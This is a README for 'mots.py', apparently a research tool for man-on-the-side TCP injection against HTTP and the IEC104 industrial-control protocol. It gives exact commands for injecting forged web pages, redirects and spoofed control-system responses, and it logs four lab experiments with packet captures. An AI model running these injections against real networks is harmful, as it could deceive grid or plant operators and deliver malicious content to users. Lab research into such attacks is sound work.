# Man-on-the-Side Attack TCP Injection; HTTP and IEC104

`mots.py` is script that monitors for a trigger, then injects TCP segments. Currently supports HTTP and IEC104. 

[![mots running](mots.gif)](https://raw.githubusercontent.com/PMaynard/mots/master/mots.gif)

# Usage

Requires the following runtime dependencies: 

- Python2
	- scapy
	- binascii
	- netifaces
	- sys
	- optparse

## HTTP

As a privileged user run the following command to inject a HTTP payload, when a `GET /` request is seen.   

	python mots.py -l ens8 -i ens3 -b 'host 10.50.50.97' -r 'GET /' -d payload/http.dat

This listens on interface `ens8`, injects the response using interface `ens3`, uses a Berkeley packet filter (BPF) of `host 10.50.50.97`, and triggers on the string value of 'GET /'. Finally, it reads the contents of `payload/http.dat` that is inserted into the payload.   


## IEC 60870-5-104

As a privileged user run the following command to inject IEC104 payload, when General Interrogation (GI) is seen.   

	python mots.py -l ens8 -i ens3 -b 'port 2404' -r '0x64010701010000000014' -d payload/iec104.dat

This listens on interface `ens8`, injects the response using interface `ens3`, uses a Berkeley packet filter (BPF) of `port 2404`, and triggers on the hex value of the IEC104 GI request `0x64010701010000000014`. Finally, it reads the contents of `payload/iec104.dat` that is inserted into the payload.   

# Payloads

The script will cache the payloads in memory, you will need to restart the script to get any changes.

- http.dat: Injects a simple `PWD` page. 
- http-301.dat: HTTP 301 redirect to example.com.
- iec104.dat: Contains a captured response from WinPP104. (single-point, double-points, and step-position information)
- iec104-two-step-position.dat: Contains two step position. 

# Packet Captures

This repository contains a number of packet captures, showing injections attacks on both protocols.

## Experiment One: HTTP Inject Response Page

- Attacker (.95): `python mots.py -l ens8 -i ens3 -b 'src host 10.50.50.96 and dst host 10.50.50.97' -r 'GET /' -d data/http.dat`
- victim (.96): `links http://10.50.50.97`
- Server (.97: `tc qdisc add dev ens3 root netem delay 500ms`; nginx running
- PCAP: EXP01-http-inject-page.pcapng

First GET: Normal victim -> Links Server
Second GET: Attacker runs mots.py as above (Injected packet ID: 22671 response to 42744)

## Experiment Two: HTTP Inject Redirect

- Attacker (.95): `python mots.py -l ens8 -i ens3 -b 'src host 10.50.50.96 and dst host 10.50.50.97' -r 'GET /' -d data/http-dat.dat`
- victim (.96): `links http://10.50.50.97`
- Server (.97: `tc qdisc add dev ens3 root netem delay 500ms`; nginx running
- PCAP: EXP02-http-inject-redirect.pcapng

First GET: Normal victim -> Links Server
Second GET: mot-01 runs above (Injected packet ID: 24068 response to 117)

## Experiment Three: IEC104 Inject Default Response

- HMI (.103): QTester104
- PLC: (.99) Winpp104 and clumsy set to 500ms lag.
- HMI (.103): `python mots.py -l ens8 -i ens3 -b 'port 2404' -r '0x64010701010000000014' -d data/iec104.dat`
	- Injected packet ID 35836 shuting down.
- Qtester104 performs GI
- PCAP: EXP03-iec104-inject-default-response.pcapng

## Experiment Four: IEC104 Inject Two Single Value Response

- HMI (.103): QTester104
- PLC: (.99) Winpp104 and clumsy set to 500ms lag.
- HMI (.103): `python mots.py -l ens8 -i ens3 -b 'port 2404' -r '0x64010701010000000014' -d data/iec104-two-single-points.dat`
	- Injected packet ID 21672 shuting down.
- Qtester104 performs GI
- PCAP: EXP04-iec104-inject-two-single-value-response.pcapng

# Alternative 

## Implementations

- https://github.com/fox-it/quantuminsert/tree/master/poc/
- https://github.com/stealth/QI
- https://github.com/kevinkoo001/MotS

## Spoofing Tools

- https://linux.die.net/man/8/packit
- http://nemesis.sourceforge.net/
